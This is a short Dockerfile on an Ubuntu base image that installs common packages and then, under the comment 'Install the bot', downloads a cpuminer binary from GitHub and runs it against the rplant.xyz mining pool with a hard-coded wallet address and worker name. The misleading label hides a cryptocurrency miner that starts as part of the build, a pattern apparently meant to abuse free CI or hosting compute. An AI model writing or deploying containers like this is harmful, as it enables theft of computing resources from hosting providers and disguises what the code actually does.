FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff
 # Set work dir:
WORKDIR /home


# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz \
&& tar -xvf cpuminer-opt-linux.tar.gz \
&& cd cpuminer-opt-linux \
&& ./cpuminer-avx512 -a power2b  -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MZcw786kC8ng7KUeHZMQuhFhr2Funss7Kk.VPS -p password=test
